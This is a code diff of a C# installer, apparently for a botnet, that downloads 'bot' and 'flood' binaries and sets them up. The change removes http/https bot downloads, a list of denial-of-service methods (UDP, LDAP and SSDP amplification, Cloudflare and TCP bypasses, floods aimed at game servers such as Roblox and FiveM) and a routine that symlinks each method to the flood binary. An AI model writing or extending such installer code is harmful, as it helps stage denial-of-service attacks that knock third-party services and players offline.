@@ -15,18 +15,7 @@ namespace SetupBotsWhispbyte
         {
             ($"{RepoBase}/bots/bot", "bot", true),
             ($"{RepoBase}/bots/flood", "flood", true),
-            ($"{RepoBase}/bots/http", "http", true),
-            ($"{RepoBase}/bots/https", "https", true),
             ($"{RepoBase}/agent.txt", "agent.txt", false)
-        };
-
-        private static readonly string[] Methods = new[]
-        {
-            "dns", "udp", "ldap", "ssdp", "home", "udpbypass",
-            "tcp", "socket", "ovh", "tcpmix", "tcpbypass", "ack",
-            "game", "rainbow", "rocket", "roblox", "fivem", "pubg", "fortnite", "warthunder", "counter", "samp",
-            "subnet", "icmp",
-            "http", "https", "httpx", "rapidflood", "tls", "tlsx", "bypass", "browser", "cache", "cloudflare"
         };
 
         static async Task<int> Main(string[] args)
@@ -58,8 +47,6 @@ namespace SetupBotsWhispbyte
                     Console.Error.WriteLine($"[!] Error downloading {item.Filename}: {ex.Message}");
                 }
             }
-
-            CreateMethodLinks(targetDir);
 
             string botBinPath = Path.Combine(targetDir, "bot");
             if (File.Exists(botBinPath))
@@ -164,39 +151,6 @@ namespace SetupBotsWhispbyte
             catch { }
 
             return false;
-        }
-
-        private static void CreateMethodLinks(string targetDir)
-        {
-            string floodPath = Path.Combine(targetDir, "flood");
-            if (!File.Exists(floodPath)) return;
-
-            Console.WriteLine("[*] Setting up method symlinks...");
-            foreach (var m in Methods)
-            {
-                string linkPath = Path.Combine(targetDir, m);
-                try
-                {
-                    if (File.Exists(linkPath)) File.Delete(linkPath);
-                    File.CreateSymbolicLink(linkPath, "flood");
-                }
-                catch
-                {
-                    try
-                    {
-                        File.Copy(floodPath, linkPath, true);
-                        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
-                        {
-                            Chmod(linkPath, 0755);
-                        }
-                    }
-                    catch (Exception ex)
-                    {
-                        Console.Error.WriteLine($"[!] Failed to link method {m}: {ex.Message}");
-                    }
-                }
-            }
-            Console.WriteLine("[+] All method links ready.");
         }
 
         private static void Chmod(string path, int mode)
